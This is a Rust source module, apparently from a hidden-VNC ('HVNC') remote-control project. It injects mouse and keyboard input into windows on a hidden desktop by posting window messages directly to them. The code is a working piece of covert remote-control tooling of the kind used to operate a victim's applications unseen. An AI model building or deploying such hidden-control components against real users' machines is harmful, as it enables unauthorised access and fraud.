//! Improved input handling for hidden desktop applications
//! 
//! This module provides better input handling specifically designed for hidden desktop scenarios
//! using direct PostMessageA to window handles instead of desktop context switching.

use crate::{HvncError, Result};
use crate::common::{InputEvent, MouseButton};
use crate::host::{WindowHandle, DesktopHandle};
use std::mem;
use winapi::um::winuser::{
    PostMessageA, SetForegroundWindow, GetForegroundWindow,
    WM_LBUTTONDOWN, WM_LBUTTONUP, WM_RBUTTONDOWN, WM_RBUTTONUP, 
    WM_MBUTTONDOWN, WM_MBUTTONUP, WM_MOUSEMOVE, WM_KEYDOWN, WM_KEYUP,
};
use log::{debug, warn, error};

/// Improved input handler for hidden desktop scenarios
pub struct ImprovedInputHandler {
    target_window: Option<WindowHandle>,
}

impl ImprovedInputHandler {
    /// Create a new improved input handler
    pub fn new() -> Result<Self> {
        Ok(Self {
            target_window: None,
        })
    }
    
    /// Set the target window for input operations
    pub fn set_target_window(&mut self, window: WindowHandle) -> Result<()> {
        self.target_window = Some(window);
        debug!("Target window set for input handler: {:?}", window);
        Ok(())
    }
    
    /// Ensure the target window is focused for input
    fn focus_target_window(&self) -> Result<()> {
        if let Some(window) = self.target_window {
            // Check if window is already focused
            let foreground_window = unsafe { GetForegroundWindow() };
            if foreground_window != window {
                debug!("Focusing target window: {:?}", window);
                let result = unsafe { SetForegroundWindow(window) };
                if result == 0 {
                    let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
                    warn!("Failed to focus target window. Error code: {}", error_code);
                    // Don't return error - continue trying to send messages
                } else {
                    debug!("Successfully focused target window");
                    // Note: Small delay removed - async context doesn't allow blocking sleep
                    // Window focus should take effect immediately for PostMessageA
                }
            }
        }
        Ok(())
    }
    
    /// Handle mouse click using PostMessageA directly to window
    pub fn handle_mouse_click(
        &self,
        x: i32,
        y: i32,
        button: MouseButton,
        pressed: bool,
    ) -> Result<()> {
        debug!("Handling mouse click: ({}, {}) button: {:?} pressed: {}", x, y, button, pressed);
        
        let window = self.target_window.ok_or_else(|| {
            HvncError::Connection("No target window set for input".to_string())
        })?;
        
        // 🐛 DEBUG: Validate window handle
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        if !is_window_valid {
            warn!("⚠️ Invalid window handle for mouse click: {:?}", window);
            return Err(HvncError::Connection("Invalid window handle for input".to_string()));
        }
        
        // Focus the target window to ensure it can receive input
        self.focus_target_window()?;
        
        // Determine the appropriate Windows message
        let message = match (button.clone(), pressed) {
            (MouseButton::Left, true) => WM_LBUTTONDOWN,
            (MouseButton::Left, false) => WM_LBUTTONUP,
            (MouseButton::Right, true) => WM_RBUTTONDOWN,
            (MouseButton::Right, false) => WM_RBUTTONUP,
            (MouseButton::Middle, true) => WM_MBUTTONDOWN,
            (MouseButton::Middle, false) => WM_MBUTTONUP,
        };
        
        // Create lParam with coordinates
        let lparam = ((y as u32) << 16) | (x as u32 & 0xFFFF);
        
        debug!("🖱️ HVNC Mouse Input: Sending {:?} {} to window {:?} at ({}, {})", 
              &button, if pressed { "DOWN" } else { "UP" }, window, x, y);
        
        // 🚀 HVNC Technique: Use PostMessageA directly to window without desktop switching
        let result = unsafe {
            PostMessageA(window, message, 0, lparam as isize)
        };
        
        if result == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            error!("❌ Failed to post mouse click message. Error code: {}", error_code);
            return Err(HvncError::windows_api_with_code(
                "Failed to post mouse click message", error_code
            ));
        }
        
        debug!("✅ HVNC Mouse click sent successfully");
        Ok(())
    }
    
    /// Handle mouse move using PostMessageA directly to window
    pub fn handle_mouse_move(&self, x: i32, y: i32) -> Result<()> {
        debug!("Handling mouse move: ({}, {})", x, y);
        
        let window = self.target_window.ok_or_else(|| {
            HvncError::Connection("No target window set for input".to_string())
        })?;
        
        // 🐛 DEBUG: Validate window handle
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        if !is_window_valid {
            warn!("⚠️ Invalid window handle for mouse move: {:?}", window);
            return Err(HvncError::Connection("Invalid window handle for input".to_string()));
        }
        
        // Focus the target window to ensure it can receive input
        self.focus_target_window()?;
        
        // Create lParam with coordinates
        let lparam = ((y as u32) << 16) | (x as u32 & 0xFFFF);
        
        // Send mouse move message
        let result = unsafe {
            PostMessageA(window, WM_MOUSEMOVE, 0, lparam as isize)
        };
        
        if result == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            error!("❌ Failed to post mouse move message. Error code: {}", error_code);
            return Err(HvncError::windows_api_with_code(
                "Failed to post mouse move message", error_code
            ));
        }
        
        debug!("Mouse move event sent successfully");
        Ok(())
    }
    
    /// Handle keyboard event using PostMessageA directly to window
    pub fn handle_keyboard_event(&self, keycode: u32, pressed: bool) -> Result<()> {
        debug!("Handling keyboard event: keycode {} pressed: {}", keycode, pressed);
        
        let window = self.target_window.ok_or_else(|| {
            HvncError::Connection("No target window set for input".to_string())
        })?;
        
        // 🐛 DEBUG: Validate window handle
        let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
        if !is_window_valid {
            warn!("⚠️ Invalid window handle for keyboard event: {:?}", window);
            return Err(HvncError::Connection("Invalid window handle for input".to_string()));
        }
        
        // Focus the target window to ensure it can receive input
        self.focus_target_window()?;
        
        // Validate keycode (Windows virtual key codes are 0-255)
        if keycode > 255 {
            return Err(HvncError::Connection(format!("Invalid keycode: {}", keycode)));
        }
        
        debug!("⌨️ HVNC Keyboard Input: Sending keycode {} {} to window {:?}", 
              keycode, if pressed { "DOWN" } else { "UP" }, window);
        
        // Send to specific window using PostMessageA
        let message = if pressed { WM_KEYDOWN } else { WM_KEYUP };
        let result = unsafe {
            PostMessageA(window, message, keycode as usize, 0)
        };
        
        if result == 0 {
            let error_code = unsafe { winapi::um::errhandlingapi::GetLastError() };
            error!("❌ Failed to post keyboard message. Error code: {}", error_code);
            return Err(HvncError::windows_api_with_code(
                "Failed to post keyboard message", error_code
            ));
        }
        
        debug!("✅ HVNC Keyboard message sent to window successfully");
        Ok(())
    }
    
    /// Process a generic input event
    pub async fn process_input_event(&self, event: InputEvent) -> Result<()> {
        debug!("Processing input event: {:?}", event);
        
        // 🐛 DEBUG: Log target window
        if let Some(window) = self.target_window {
            debug!("Target window handle: {:?}", window);
            
            // Validate window handle
            let is_window_valid = unsafe { winapi::um::winuser::IsWindow(window) != 0 };
            let is_window_visible = unsafe { winapi::um::winuser::IsWindowVisible(window) != 0 };
            debug!("Window validation - valid: {}, visible: {}", is_window_valid, is_window_visible);
        } else {
            warn!("No target window set for input processing");
        }
        
        match event {
            InputEvent::MouseClick { x, y, button } => {
                debug!("Processing mouse click at ({}, {}) with button {:?}", x, y, button);
                // Send mouse down and up events
                self.handle_mouse_click(x, y, button.clone(), true)?;
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await; // Small delay
                self.handle_mouse_click(x, y, button, false)?;
            }
            InputEvent::MouseMove { x, y } => {
                debug!("Processing mouse move to ({}, {})", x, y);
                self.handle_mouse_move(x, y)?;
            }
            InputEvent::KeyPress { keycode, pressed } => {
                debug!("Processing key event: keycode {} {}", keycode, if pressed { "pressed" } else { "released" });
                self.handle_keyboard_event(keycode, pressed)?;
            }
        }
        
        Ok(())
    }
}